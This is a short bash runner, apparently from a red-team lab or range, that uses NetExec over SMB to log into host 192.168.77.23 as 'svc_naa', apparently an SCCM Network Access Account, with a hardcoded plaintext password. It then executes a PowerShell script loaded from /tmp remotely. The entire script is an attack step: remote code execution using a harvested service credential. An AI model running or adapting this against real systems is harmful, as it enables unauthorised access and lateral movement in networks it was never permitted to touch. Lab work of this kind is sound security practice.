#!/bin/bash
# SCCM mbr02 review part C runner
NXC=/home/vagrant/campaign-venv/bin/nxc
C=$(cat /tmp/sccm-review-mbr02-c.ps1)
$NXC smb 192.168.77.23 -u svc_naa -p 'N@A_s3rv1c3!' -d range -X "$C"
